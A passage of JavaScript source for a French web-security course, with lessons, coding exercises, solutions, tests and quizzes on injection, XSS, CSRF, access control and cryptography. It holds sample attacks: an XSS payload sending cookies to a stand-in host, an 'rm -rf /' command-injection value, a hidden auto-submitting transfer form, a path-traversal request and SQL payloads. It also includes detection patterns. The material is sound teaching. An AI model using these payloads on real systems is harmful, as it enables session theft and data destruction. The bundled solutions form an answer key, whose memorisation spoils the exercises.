<p>Le moteur reçoit la requête et les valeurs par deux canaux distincts : une apostrophe dans la valeur reste une apostrophe. C'est la <em>seule</em> parade complète. Les ORM (SQLAlchemy, Prisma, Django ORM) paramètrent par défaut, sauf quand on leur passe du SQL brut.</p>
<h2>Ce qui ne suffit pas</h2>
<ul><li>Échapper les apostrophes à la main : contournable (encodages, types numériques sans guillemets).</li><li>Filtrer des mots-clés (<code>SELECT</code>, <code>OR</code>) : contournable (<code>SeLeCt</code>, commentaires, encodage) et bloque des utilisateurs légitimes (M. Ordonnez).</li><li>Un WAF : utile en défense en profondeur, jamais seul.</li></ul>
<h2>Variantes</h2>
<p><strong>Injection aveugle</strong> : pas de résultat affiché, mais une différence de comportement (page différente, délai avec <code>SLEEP(5)</code>) permet d'extraire la base bit par bit, automatiquement (sqlmap). <strong>Injection NoSQL</strong> : <code>{"email": {"$ne": null}}</code> dans une requête MongoDB construite depuis du JSON non validé. <strong>Injection de commandes</strong> : <code>os.system("ping " + hote)</code> avec <code>hote = "8.8.8.8; rm -rf /"</code>. Même principe, même parade : ne jamais construire une instruction par concaténation ; utiliser les API qui séparent code et données.</p>
<h2>Défense en profondeur</h2>
<ul><li>Compte base de données avec le minimum de droits (pas de <code>DROP</code>, pas d'accès aux autres tables).</li><li>Validation des entrées par type (un identifiant est un entier : <code>int(id)</code> lève une erreur sinon).</li><li>Messages d'erreur génériques en production (pas la requête SQL dans la page).</li><li>Revue de code et tests automatiques avec des charges utiles classiques.</li></ul>
<div class="callout info"><b>Lab</b>Tu vas écrire un détecteur de charges utiles d'injection (comme un WAF, pour la journalisation) ET un simulateur de requête paramétrée qui montre pourquoi la séparation code/données neutralise l'attaque.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Détecter et neutraliser',
            enonce: `<p>1) Écris <code>semblerInjection(entree)</code> qui renvoie <code>true</code> si l'entrée contient un motif suspect : apostrophe suivie de <code>OR</code>/<code>AND</code> (insensible à la casse, espaces variables), commentaire SQL (<code>--</code> ou <code>/*</code>), <code>UNION SELECT</code>, point-virgule suivi d'un mot-clé (<code>DROP</code>, <code>DELETE</code>, <code>INSERT</code>, <code>UPDATE</code>), ou <code>1=1</code>. 2) Écris <code>requeteConcatenee(email)</code> qui construit (dangereusement) <code>SELECT * FROM users WHERE email = '…'</code> et <code>requeteParametree(email)</code> qui renvoie <code>{ sql: "SELECT * FROM users WHERE email = ?", params: [email] }</code>. Affiche les deux pour l'entrée <code>' OR '1'='1' --</code>.</p>`,
            depart: `function semblerInjection(entree) {
  // ...
}

function requeteConcatenee(email) {
  // ...
}

function requeteParametree(email) {
  // ...
}

const attaque = "' OR '1'='1' --";
console.log(semblerInjection(attaque), semblerInjection("marie.ordonnez@mail.fr"));
console.log(requeteConcatenee(attaque));
console.log(requeteParametree(attaque));
`,
            solution: `function semblerInjection(entree) {
  const motifs = [
    /'\\s*(or|and)\\b/i,
    /--|\\/\\*/,
    /union\\s+select/i,
    /;\\s*(drop|delete|insert|update)\\b/i,
    /\\b1\\s*=\\s*1\\b/,
  ];
  return motifs.some(m => m.test(entree));
}

function requeteConcatenee(email) {
  return "SELECT * FROM users WHERE email = '" + email + "'";
}

function requeteParametree(email) {
  return { sql: "SELECT * FROM users WHERE email = ?", params: [email] };
}

const attaque = "' OR '1'='1' --";
console.log(semblerInjection(attaque), semblerInjection("marie.ordonnez@mail.fr"));
console.log(requeteConcatenee(attaque));
console.log(requeteParametree(attaque));`,
            tests: [sansErreur(), expr('semblerInjection("\' OR \'1\'=\'1\' --")', true), expr('semblerInjection("x\' or 1=1")', true), expr('semblerInjection("1; DROP TABLE users")', true), expr('semblerInjection("a\' UNION SELECT carte FROM paiements --")', true), expr('semblerInjection("marie.ordonnez@mail.fr")', false, 'Un email normal ne doit pas être signalé (pas de filtrage sur de simples mots).'), expr('semblerInjection("Mon code est SELECTION")', false, 'Le mot SELECT seul (dans SELECTION) n\'est pas un motif d\'injection.'), expr('requeteConcatenee("\' OR \'1\'=\'1\' --")', "SELECT * FROM users WHERE email = '' OR '1'='1' --'"), expr('requeteParametree("\' OR 1=1")', { sql: 'SELECT * FROM users WHERE email = ?', params: ["' OR 1=1"] })]
          },
          quiz: [
            { q: 'Quelle est la seule parade complète à l\'injection SQL ?', options: ['Filtrer les mots-clés SQL', 'Les requêtes paramétrées (préparées)', 'Un pare-feu applicatif'], bonne: 1, explication: 'Code et données transitent séparément ; la valeur n\'est jamais interprétée.' },
            { q: 'Que fait <code>--</code> dans une charge utile SQL ?', options: ['Soustrait', 'Commente le reste de la requête', 'Termine la connexion'], bonne: 1, explication: 'Ce qui suit (par exemple la vérification du mot de passe) est ignoré.' },
            { q: 'Pourquoi un compte base de données à droits limités ?', options: ['Pour la performance', 'Pour limiter les dégâts si une injection réussit malgré tout', 'C\'est obligatoire légalement'], bonne: 1, explication: 'Défense en profondeur : pas de DROP possible sans le droit DROP.' }
          ]
        },
        {
          titre: 'XSS : injection dans le navigateur',
          theorie: `<p>Le <strong>Cross-Site Scripting</strong> (XSS) consiste à faire exécuter du JavaScript attaquant dans le navigateur d'une victime, via une page qui affiche des données non échappées. Le script tourne avec les droits de l'utilisateur : vol de session, actions à son insu, faux formulaires de connexion, enregistrement des frappes.</p>
<h2>Trois formes</h2>
<ul><li><strong>Stocké</strong> : le script est enregistré (commentaire, profil) et servi à tous les visiteurs. Le plus grave.</li><li><strong>Réfléchi</strong> : le script est dans l'URL (<code>?q=&lt;script&gt;…</code>) renvoyée dans la page ; la victime clique un lien piégé.</li><li><strong>DOM</strong> : le JavaScript de la page lui-même insère une donnée non sûre (<code>innerHTML = location.hash</code>).</li></ul>
${code('html', `<!-- Page vulnérable : affiche le commentaire tel quel -->
<p>Commentaire : <?= $commentaire ?></p>
<!-- Commentaire soumis : -->
<img src=x onerror="fetch('https://attaquant.fr/?c=' + document.cookie)">
<!-- Chaque visiteur envoie ses cookies à l'attaquant -->`)}
<h2>Parade 1 : échapper à la sortie</h2>
<p>Toute donnée insérée dans du HTML est <strong>échappée selon le contexte</strong> : <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>&amp;</code> → <code>&amp;amp;</code>, <code>"</code> → <code>&amp;quot;</code>, <code>'</code> → <code>&amp;#39;</code>. Les moteurs de templates modernes (Jinja2, Twig, React, Vue) le font par défaut ; la faille vient des exceptions (<code>|safe</code>, <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, <code>innerHTML</code>).</p>
${code('javascript', `function echapperHTML(s) {
  return String(s).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}
// Côté DOM : préférer textContent, createElement, setAttribute à innerHTML`)}
<p>Le contexte compte : dans un attribut <code>href</code>, <code>javascript:alert(1)</code> passe l'échappement HTML ; il faut valider le schéma (<code>http</code>/<code>https</code> seulement). Dans du JavaScript inline, dans du CSS, dans une URL : chaque contexte a ses règles. Évite d'insérer des données dans ces contextes.</p>
<h2>Parade 2 : Content-Security-Policy</h2>
${code('bash', `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'`)}
<p>Le navigateur n'exécute que les scripts provenant des sources autorisées (ou portant le nonce aléatoire de la réponse) ; les scripts inline injectés et les <code>onerror=</code> sont bloqués. CSP ne remplace pas l'échappement mais limite les dégâts d'un oubli. Commencer en mode <code>Content-Security-Policy-Report-Only</code> pour mesurer sans casser.</p>
<h2>Parade 3 : limiter l'impact</h2>
<p>Cookies <code>HttpOnly</code> (le script ne les lit pas), jetons de session courts, <code>SameSite</code>. Et une bibliothèque d'assainissement (DOMPurify) quand on doit vraiment accepter du HTML (éditeur riche) : liste blanche de balises et d'attributs, jamais une liste noire.</p>
<h2>Tester</h2>
<p>Charges utiles classiques, à essayer sur ses propres applications : <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>"&gt;&lt;svg onload=alert(1)&gt;</code>, <code>javascript:alert(1)</code> dans un lien. Si une alerte apparaît, un attaquant peut tout faire.</p>
<div class="callout info"><b>Lab</b>Tu implémentes l'échappement HTML, une validation d'URL et un assainisseur minimal à liste blanche, puis tu les testes contre les charges classiques.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Échapper, valider, assainir',
            enonce: `<p>Écris <code>echapperHTML(s)</code> (les cinq caractères <code>&amp; &lt; &gt; " '</code>), <code>urlSure(url)</code> qui renvoie <code>true</code> seulement pour des URL commençant par <code>http://</code>, <code>https://</code>, <code>/</code> (relatives) ou <code>mailto:</code>, insensible à la casse et aux espaces/tabulations initiaux (donc <code>javascript:</code> et <code>data:</code> refusés), et <code>assainir(html)</code> qui retire toute balise sauf <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;p&gt;</code> et <code>&lt;br&gt;</code> (ouvrantes et fermantes, sans attributs) et supprime tout attribut commençant par <code>on</code>. Affiche les résultats pour les charges fournies.</p>`,
            depart: `function echapperHTML(s) {
  // ...
}

function urlSure(url) {
  // ...
}

function assainir(html) {
  // ...
}

console.log(echapperHTML('<img src=x onerror="alert(1)">'));
console.log(urlSure("javascript:alert(1)"), urlSure("https://exemple.fr"));
console.log(assainir('<p onclick="x()">Bonjour <b>monde</b> <script>alert(1)</script></p>'));
`,
            solution: `function echapperHTML(s) {
  return String(s).replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

function urlSure(url) {
  const u = String(url).replace(/^[\\s\\u0000-\\u001f]+/, "").toLowerCase();
  return /^(https?:\\/\\/|\\/|mailto:)/.test(u);
}

function assainir(html) {
  return String(html).replace(/<\\/?([a-zA-Z0-9]+)([^>]*)>/g, (tout, nom, attrs) => {
    const n = nom.toLowerCase();
    if (!["b", "i", "p", "br"].includes(n)) return "";
    const fermante = tout.startsWith("</");
    return fermante ? "</" + n + ">" : "<" + n + ">";
  });
}

console.log(echapperHTML('<img src=x onerror="alert(1)">'));
console.log(urlSure("javascript:alert(1)"), urlSure("https://exemple.fr"));
console.log(assainir('<p onclick="x()">Bonjour <b>monde</b> <script>alert(1)</script></p>'));`,
            tests: [sansErreur(), expr('echapperHTML(\'<img src=x onerror="alert(1)">\')', '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'), expr('echapperHTML("Tom & Jerry\'s")', 'Tom &amp; Jerry&#39;s'), expr('urlSure("https://exemple.fr/page")', true), expr('urlSure("/compte")', true), expr('urlSure("javascript:alert(1)")', false), expr('urlSure("  JaVaScRiPt:alert(1)")', false, 'Normalise la casse et retire les espaces initiaux avant de tester.'), expr('urlSure("data:text/html,<script>alert(1)</script>")', false), expr('assainir(\'<p onclick="x()">Bonjour <b>monde</b> <script>alert(1)</script></p>\')', '<p>Bonjour <b>monde</b> alert(1)</p>'), expr('assainir(\'<img src=x onerror=alert(1)><i>ok</i>\')', '<i>ok</i>'), exprVerif('assainir("<B onmouseover=x>gras</B>")', 'Balises autorisées normalisées sans attributs', v => v === '<b>gras</b>')]
          },
          quiz: [
            { q: 'Quelle est la parade principale au XSS ?', options: ['Bloquer le mot script', 'Échapper les données à la sortie selon le contexte', 'Désactiver JavaScript'], bonne: 1, explication: 'Les données deviennent du texte inerte ; les filtres par mots-clés se contournent.' },
            { q: 'Que bloque une CSP avec <code>script-src \'self\'</code> ?', options: ['Toutes les images', 'Les scripts inline et ceux d\'autres origines', 'Les cookies'], bonne: 1, explication: 'Un &lt;script&gt; injecté ou un onerror= inline ne s\'exécute pas.' },
            { q: 'Pourquoi <code>HttpOnly</code> limite-t-il l\'impact d\'un XSS ?', options: ['Il bloque le script', 'Le script ne peut pas lire le cookie de session', 'Il force HTTPS'], bonne: 1, explication: 'Le vol de session direct devient impossible, même si d\'autres actions restent possibles.' }
          ]
        },
        {
          titre: 'Sessions, cookies et CSRF',
          theorie: `<p>HTTP est sans état : chaque requête est indépendante. La <strong>session</strong> relie les requêtes d'un même utilisateur, généralement par un cookie. Tout ce qui touche à ce mécanisme est critique : si un attaquant obtient ou fait utiliser ta session, il est toi.</p>
<h2>Cycle de vie d'une session sûre</h2>
<ol><li>Connexion réussie → le serveur génère un identifiant <strong>aléatoire</strong> (≥ 128 bits, <code>secrets.token_urlsafe(32)</code>), jamais prévisible, jamais dérivé de l'email ou de l'heure.</li><li>Il est envoyé dans un cookie <code>HttpOnly; Secure; SameSite=Lax; Path=/</code>, avec une durée limitée.</li><li>Régénérer l'identifiant à la connexion (anti-fixation) et à tout changement de privilège.</li><li>Expiration par inactivité (30 min pour une banque, plus pour un forum) et absolue (quelques jours).</li><li>Déconnexion = destruction côté serveur, pas seulement suppression du cookie.</li></ol>
<h2>CSRF : utiliser la session de la victime</h2>
<p><strong>Cross-Site Request Forgery</strong> : un site malveillant déclenche depuis le navigateur de la victime une requête vers un site où elle est connectée ; le navigateur joint automatiquement le cookie de session.</p>
${code('html', `<!-- Sur attaquant.fr, invisible : -->
<form action="https://banque.fr/virement" method="post" id="f">
  <input name="vers" value="FR76 ATTAQUANT"><input name="montant" value="5000">
</form>
<script>document.getElementById("f").submit()</script>`)}
<p>Si <code>banque.fr</code> ne vérifie que le cookie, le virement part. Parades, à combiner :</p>
<ul><li><strong>SameSite=Lax</strong> (défaut des navigateurs modernes) : le cookie n'est pas envoyé sur les requêtes POST initiées par un autre site. <code>Strict</code> bloque aussi les GET de navigation.</li><li><strong>Jeton anti-CSRF</strong> : valeur aléatoire liée à la session, insérée dans chaque formulaire (champ caché) ou en-tête, vérifiée côté serveur. Un site tiers ne peut pas la lire (politique de même origine).</li><li><strong>Ne jamais modifier l'état sur un GET</strong> : <code>GET /supprimer?id=3</code> est exploitable par une simple image.</li><li>Vérifier les en-têtes <code>Origin</code>/<code>Referer</code> en défense supplémentaire.</li></ul>
<h2>JWT : les pièges</h2>
<p>Un JWT (<code>en-tête.charge.signature</code> en base64url) est pratique pour les API sans état. Erreurs fréquentes : accepter <code>alg: none</code> ; confondre clé publique et secret HMAC ; pas d'expiration (<code>exp</code>) ; stocker le jeton dans <code>localStorage</code> (lisible par XSS) plutôt qu'un cookie HttpOnly ; impossible à révoquer sans liste noire. Un identifiant de session opaque est souvent plus simple et plus sûr qu'un JWT pour une application web classique.</p>
<h2>Autres attaques de session</h2>
<p><strong>Fixation</strong> : l'attaquant impose un identifiant connu (régénérer à la connexion). <strong>Vol par XSS</strong> (HttpOnly). <strong>Vol sur le réseau</strong> (HTTPS + Secure + HSTS). <strong>Prédiction</strong> (aléatoire cryptographique).</p>
<div class="callout info"><b>Lab</b>Tu vas analyser des cookies <code>Set-Cookie</code> et vérifier des jetons anti-CSRF comme le ferait un middleware.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Middleware anti-CSRF',
            enonce: `<p>Écris <code>analyserCookie(setCookie)</code> qui renvoie <code>{ nom, valeur, httpOnly, secure, sameSite }</code> (<code>sameSite</code> = <code>"Lax"</code>, <code>"Strict"</code>, <code>"None"</code> ou <code>null</code>), <code>genererJeton()</code> qui renvoie 32 octets aléatoires de <code>crypto.getRandomValues</code> en hexadécimal (64 caractères), et <code>verifierRequete(req, session)</code> qui accepte (<code>true</code>) une requête <code>{ methode, origine, jeton }</code> si : la méthode est <code>GET</code>/<code>HEAD</code>, ou bien (méthode modifiante) l'origine est <code>"https://app.fr"</code> ET le jeton est égal à <code>session.jeton</code>. Toute autre combinaison est refusée.</p>`,
            depart: `function analyserCookie(setCookie) {
  // ...
}

function genererJeton() {
  // ...
}

function verifierRequete(req, session) {
  // ...
}

const session = { id: "s1", jeton: genererJeton() };
console.log(analyserCookie("session=abc; HttpOnly; Secure; SameSite=Lax; Path=/"));
console.log(verifierRequete({ methode: "POST", origine: "https://attaquant.fr", jeton: session.jeton }, session));
`,
            solution: `function analyserCookie(setCookie) {
  const parties = setCookie.split(";").map(p => p.trim());
  const [nom, ...reste] = parties[0].split("=");
  const attrs = parties.slice(1).map(p => p.toLowerCase());
  const ss = parties.slice(1).find(p => /^samesite=/i.test(p));
  return {
    nom,
    valeur: reste.join("="),
    httpOnly: attrs.includes("httponly"),
    secure: attrs.includes("secure"),
    sameSite: ss ? ss.split("=")[1].charAt(0).toUpperCase() + ss.split("=")[1].slice(1).toLowerCase() : null,
  };
}

function genererJeton() {
  const octets = crypto.getRandomValues(new Uint8Array(32));
  return [...octets].map(o => o.toString(16).padStart(2, "0")).join("");
}

function verifierRequete(req, session) {
  const sure = ["GET", "HEAD"].includes(req.methode.toUpperCase());
  if (sure) return true;
  return req.origine === "https://app.fr" && typeof req.jeton === "string" && req.jeton === session.jeton;
}

const session = { id: "s1", jeton: genererJeton() };
console.log(analyserCookie("session=abc; HttpOnly; Secure; SameSite=Lax; Path=/"));
console.log(verifierRequete({ methode: "POST", origine: "https://attaquant.fr", jeton: session.jeton }, session));`,
            tests: [sansErreur(), expr('analyserCookie("session=abc; HttpOnly; Secure; SameSite=Lax; Path=/")', { nom: 'session', valeur: 'abc', httpOnly: true, secure: true, sameSite: 'Lax' }), expr('analyserCookie("id=x=y; samesite=strict")', { nom: 'id', valeur: 'x=y', httpOnly: false, secure: false, sameSite: 'Strict' }), expr('analyserCookie("t=1").sameSite', null), exprVerif('genererJeton()', 'Jeton hexadécimal de 64 caractères', v => /^[0-9a-f]{64}$/.test(v)), exprVerif('genererJeton() !== genererJeton()', 'Deux jetons sont différents', v => v === true), codeContient('crypto.getRandomValues', 'Utilise crypto.getRandomValues pour l\'aléatoire cryptographique (jamais Math.random).'), expr('verifierRequete({ methode: "GET", origine: "https://attaquant.fr" }, session)', true), expr('verifierRequete({ methode: "POST", origine: "https://app.fr", jeton: session.jeton }, session)', true), expr('verifierRequete({ methode: "POST", origine: "https://attaquant.fr", jeton: session.jeton }, session)', false), expr('verifierRequete({ methode: "post", origine: "https://app.fr", jeton: "faux" }, session)', false), expr('verifierRequete({ methode: "DELETE", origine: "https://app.fr" }, session)', false, 'Sans jeton, une requête modifiante est refusée.')]
          },
          quiz: [
            { q: 'Pourquoi un jeton anti-CSRF protège-t-il ?', options: ['Il chiffre la requête', 'Un site tiers ne peut pas lire le jeton de la victime (même origine)', 'Il bloque les cookies'], bonne: 1, explication: 'Le navigateur envoie le cookie automatiquement, mais pas un champ que l\'attaquant ne connaît pas.' },
            { q: 'Que doit faire le serveur à la connexion réussie ?', options: ['Garder l\'identifiant de session existant', 'Régénérer l\'identifiant de session', 'Envoyer le mot de passe dans le cookie'], bonne: 1, explication: 'Cela neutralise la fixation de session.' },
            { q: 'Pourquoi ne pas modifier l\'état sur une requête GET ?', options: ['GET est plus lent', 'Une simple image ou un lien suffit à la déclencher à l\'insu de l\'utilisateur', 'GET n\'a pas de cookies'], bonne: 1, explication: 'Les actions (suppression, virement) passent par POST/PUT/DELETE avec jeton.' }
          ]
        },
        {
          titre: 'Contrôle d\'accès et validation des entrées',
          theorie: `<p>Le <strong>contrôle d'accès défaillant</strong> est la faille n° 1 du Top 10 OWASP 2021. Elle est simple à décrire : l'application vérifie <em>qui tu es</em> (authentification) mais pas <em>ce que tu as le droit de faire</em> (autorisation) sur <em>cette</em> ressource.</p>
<h2>IDOR : la référence directe</h2>
${code('bash', `GET /api/factures/1042        # ma facture
GET /api/factures/1043        # celle du voisin, si le serveur ne vérifie pas le propriétaire`)}
<p><em>Insecure Direct Object Reference</em> : l'identifiant dans l'URL suffit. Parade : à chaque accès, vérifier que la ressource appartient à l'utilisateur authentifié (<code>WHERE id = ? AND proprietaire = ?</code>), côté serveur, systématiquement. Des identifiants non devinables (UUID) réduisent l'énumération mais ne remplacent pas la vérification.</p>
<h2>Les autres classiques</h2>
<ul><li><strong>Élévation verticale</strong> : un utilisateur appelle une route admin (<code>/admin/users</code>) qui n'est protégée que par l'absence de lien dans le menu.</li><li><strong>Paramètre de rôle manipulable</strong> : <code>{"role": "admin"}</code> accepté dans la requête de mise à jour de profil (mass assignment).</li><li><strong>Contrôle côté client uniquement</strong> : bouton désactivé en JavaScript, mais l'API accepte la requête.</li><li><strong>CORS trop permissif</strong> : <code>Access-Control-Allow-Origin: *</code> avec identifiants.</li><li><strong>Traversée de répertoire</strong> : <code>GET /fichiers?nom=../../etc/passwd</code>.</li></ul>
<h2>Concevoir l'autorisation</h2>
<ol><li><strong>Refus par défaut</strong> : tout ce qui n'est pas explicitement autorisé est interdit.</li><li>Un point central (middleware, décorateur) : <code>@require_role("admin")</code>, <code>@owns(Facture)</code>. Pas de vérification dispersée et oubliée.</li><li>Modèle clair : RBAC (rôles) pour la plupart des applications, ABAC (attributs) quand les règles dépendent du contexte (propriétaire, équipe, horaire).</li><li>Tests automatiques : « l'utilisateur B reçoit 403 sur la ressource de A » pour chaque route.</li><li>Journaliser les refus : une rafale de 403 sur des identifiants successifs est une énumération en cours.</li></ol>
<h2>Validation des entrées</h2>
<p>Deuxième ligne de défense transversale. Valider <strong>côté serveur</strong>, par <strong>liste blanche</strong> (ce qui est permis), selon le <strong>type</strong> attendu :</p>
<table><tr><th>Donnée</th><th>Validation</th></tr>
<tr><td>Identifiant</td><td>entier positif ou UUID ; rejeter le reste</td></tr>
<tr><td>Email</td><td>format raisonnable + confirmation par lien ; longueur max</td></tr>
<tr><td>Nom de fichier</td><td>pas de <code>/</code>, <code>\\</code>, <code>..</code> ; générer son propre nom ; vérifier le type réel (magic bytes), pas l'extension</td></tr>
<tr><td>Nombre / montant</td><td>bornes min/max, pas de négatif inattendu</td></tr>
<tr><td>Texte libre</td><td>longueur max, encodage UTF-8 valide ; l'échappement se fait à la sortie</td></tr>
<tr><td>Énumération (statut, rôle)</td><td>valeur dans une liste fermée</td></tr></table>
<p>Les bibliothèques de schéma (Pydantic, Zod, Joi) déclarent ces règles une fois et rejettent tout champ inattendu : c'est la parade au mass assignment.</p>
<h2>Téléversement de fichiers</h2>
<p>Stocker hors de la racine web, nom généré, type vérifié, taille limitée, servir via un domaine séparé ou avec <code>Content-Disposition: attachment</code>. Un <code>avatar.php</code> accepté et exécuté par le serveur est une prise de contrôle totale.</p>
<div class="callout info"><b>Lab</b>Tu écris un contrôleur d'accès avec propriétaire et rôles, puis un validateur de schéma qui rejette les champs inattendus.</div>`,
          exercice: {
            type: 'code', langage: 'javascript', titre: 'Autorisation et schéma',
            enonce: `<p>1) Écris <code>peutAcceder(utilisateur, ressource, action)</code> : un <code>admin</code> peut tout ; un <code>membre</code> peut <code>lire</code> et <code>modifier</code> uniquement les ressources dont <code>proprietaire === utilisateur.id</code>, et <code>supprimer</code> rien ; tout autre rôle ou cas → <code>false</code> (refus par défaut). 2) Écris <code>validerProfil(donnees)</code> qui renvoie <code>{ ok: true, valeur }</code> ou <code>{ ok: false, erreurs: [...] }</code> selon le schéma : <code>nom</code> chaîne de 1 à 50 caractères (obligatoire), <code>age</code> entier entre 0 et 130 (optionnel), <code>statut</code> parmi <code>"actif"</code>/<code>"inactif"</code> (optionnel) ; tout champ non prévu (par exemple <code>role</code>) produit l'erreur <code>"champ inattendu : role"</code>. <code>valeur</code> ne contient que les champs validés.</p>`,
            depart: `function peutAcceder(utilisateur, ressource, action) {
  // ...
}

function validerProfil(donnees) {
  // ...
}

const ana = { id: 1, role: "membre" }, root = { id: 9, role: "admin" };
const doc = { id: 42, proprietaire: 1 };
console.log(peutAcceder(ana, doc, "modifier"), peutAcceder(ana, { id: 43, proprietaire: 2 }, "lire"));
console.log(validerProfil({ nom: "Ana", age: 34, role: "admin" }));
`,
            solution: `function peutAcceder(utilisateur, ressource, action) {
  if (!utilisateur || !ressource) return false;
  if (utilisateur.role === "admin") return true;
  if (utilisateur.role === "membre") {
    const proprietaire = ressource.proprietaire === utilisateur.id;
    return proprietaire && (action === "lire" || action === "modifier");
  }
  return false;
}

function validerProfil(donnees) {
  const erreurs = [];
  const valeur = {};
  const autorises = ["nom", "age", "statut"];
  for (const cle of Object.keys(donnees || {})) {
    if (!autorises.includes(cle)) erreurs.push("champ inattendu : " + cle);
  }
  if (typeof donnees.nom !== "string" || donnees.nom.length < 1 || donnees.nom.length > 50) {
    erreurs.push("nom invalide");
  } else valeur.nom = donnees.nom;
  if ("age" in donnees) {
    if (Number.isInteger(donnees.age) && donnees.age >= 0 && donnees.age <= 130) valeur.age = donnees.age;
    else erreurs.push("age invalide");
  }
  if ("statut" in donnees) {
    if (["actif", "inactif"].includes(donnees.statut)) valeur.statut = donnees.statut;
    else erreurs.push("statut invalide");
  }
  return erreurs.length ? { ok: false, erreurs } : { ok: true, valeur };
}

const ana = { id: 1, role: "membre" }, root = { id: 9, role: "admin" };
const doc = { id: 42, proprietaire: 1 };
console.log(peutAcceder(ana, doc, "modifier"), peutAcceder(ana, { id: 43, proprietaire: 2 }, "lire"));
console.log(validerProfil({ nom: "Ana", age: 34, role: "admin" }));`,
            tests: [sansErreur(), expr('peutAcceder({ id: 1, role: "membre" }, { proprietaire: 1 }, "modifier")', true), expr('peutAcceder({ id: 1, role: "membre" }, { proprietaire: 2 }, "lire")', false, 'IDOR : un membre ne lit pas la ressource d\'un autre.'), expr('peutAcceder({ id: 1, role: "membre" }, { proprietaire: 1 }, "supprimer")', false), expr('peutAcceder({ id: 9, role: "admin" }, { proprietaire: 2 }, "supprimer")', true), expr('peutAcceder({ id: 3, role: "invite" }, { proprietaire: 3 }, "lire")', false, 'Refus par défaut pour tout rôle inconnu.'), expr('peutAcceder(null, { proprietaire: 1 }, "lire")', false), expr('validerProfil({ nom: "Ana", age: 34, role: "admin" })', { ok: false, erreurs: ['champ inattendu : role'] }), expr('validerProfil({ nom: "Ana", age: 34, statut: "actif" })', { ok: true, valeur: { nom: 'Ana', age: 34, statut: 'actif' } }), expr('validerProfil({ nom: "", age: 200 }).erreurs', ['nom invalide', 'age invalide']), expr('validerProfil({ nom: "Bob", age: 3.5 }).ok', false), expr('validerProfil({ nom: "Bob", statut: "banni" }).ok', false)]
          },
          quiz: [
            { q: 'Qu\'est-ce qu\'un IDOR ?', options: ['Une injection', 'Un accès à une ressource via son identifiant sans vérification du propriétaire', 'Une attaque réseau'], bonne: 1, explication: 'La parade : vérifier l\'autorisation côté serveur à chaque accès.' },
            { q: 'Que signifie « refus par défaut » ?', options: ['Tout est interdit sauf autorisation explicite', 'Tout est permis sauf interdiction', 'Les admins sont refusés'], bonne: 0, explication: 'Un oubli devient un refus (sûr) plutôt qu\'un accès (dangereux).' },
            { q: 'Comment valider un nom de fichier téléversé ?', options: ['Faire confiance à l\'extension', 'Générer son propre nom et vérifier le type réel du contenu', 'Accepter tout mais le chiffrer'], bonne: 1, explication: 'L\'extension et le Content-Type sont contrôlés par l\'attaquant.' }
          ]
        }
      ]
    },
    {
      titre: 'Cryptographie, réseau et détection', niveau: 'Avancé', description: 'Chiffrement avec Web Crypto, encodages, réseau et pare-feu, analyse de journaux.',
      lecons: [
        {
          titre: 'Chiffrement symétrique et asymétrique',
          theorie: `<p>Le <strong>chiffrement</strong> rend une donnée illisible sans la clé. Deux familles complémentaires font tourner HTTPS, les messageries protégées, les disques et les sauvegardes.</p>
<h2>Symétrique : une clé partagée</h2>
<p>La même clé chiffre et déchiffre. Rapide, adapté aux gros volumes. Standard actuel : <strong>AES-256-GCM</strong> (ou ChaCha20-Poly1305). Le mode <em>GCM</em> est <em>authentifié</em> : il détecte toute altération. Il exige un <strong>nonce</strong> (IV) unique de 12 octets par message : réutiliser un nonce avec la même clé casse la sécurité.</p>
${code('javascript', `const cle = await crypto.subtle.generateKey({ name: "AES-GCM", length: 256 }, true, ["encrypt", "decrypt"]);
const iv = crypto.getRandomValues(new Uint8Array(12));             // nonce unique par message
const chiffre = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cle, new TextEncoder().encode("secret"));
const clair = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, cle, chiffre);   // lève si altéré
new TextDecoder().decode(clair);   // "secret"`)}
<h2>Dériver une clé d'un mot de passe</h2>
<p>Un mot de passe n'est pas une clé : trop court, pas uniforme. On le passe dans une fonction de dérivation lente avec un sel : <strong>PBKDF2</strong> (≥ 600 000 itérations), scrypt ou Argon2. C'est ainsi que fonctionnent les coffres de mots de passe et les archives protégées.</p>
${code('javascript', `const materiau = await crypto.subtle.importKey("raw", new TextEncoder().encode(motDePasse), "PBKDF2", false, ["deriveKey"]);
const cle = await crypto.subtle.deriveKey({ name: "PBKDF2", salt, iterations: 600000, hash: "SHA-256" }, materiau,
                                          { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);`)}
<h2>Asymétrique : une paire de clés</h2>
<p>Une clé <strong>publique</strong> (diffusable) et une clé <strong>privée</strong> (secrète). Ce que l'une chiffre, l'autre déchiffre. Deux usages :</p>
<ul><li><strong>Chiffrer pour quelqu'un</strong> : avec sa clé publique ; lui seul déchiffre avec sa privée.</li><li><strong>Signer</strong> : avec sa clé privée ; tout le monde vérifie avec la publique. Preuve d'origine et d'intégrité (certificats TLS, mises à jour logicielles, commits Git signés).</li></ul>
<p>Algorithmes : RSA (3072 bits recommandé) et surtout les courbes elliptiques : <strong>Ed25519</strong> pour signer, <strong>X25519</strong> pour échanger une clé. Lent : on ne chiffre pas un fichier en RSA, on chiffre une clé AES avec RSA (chiffrement hybride).</p>
<h2>Comment HTTPS assemble tout cela</h2>
<ol><li>Le serveur présente son certificat (clé publique + identité, signé par une autorité).</li><li>Le navigateur vérifie la signature de l'autorité et le nom de domaine.</li><li>Un échange de clés éphémère (ECDHE) établit une clé de session AES inconnue des tiers, même en enregistrant le trafic (confidentialité persistante).</li><li>Le reste de la connexion est chiffré en AES-GCM.</li></ol>
<h2>Les règles d'or</h2>
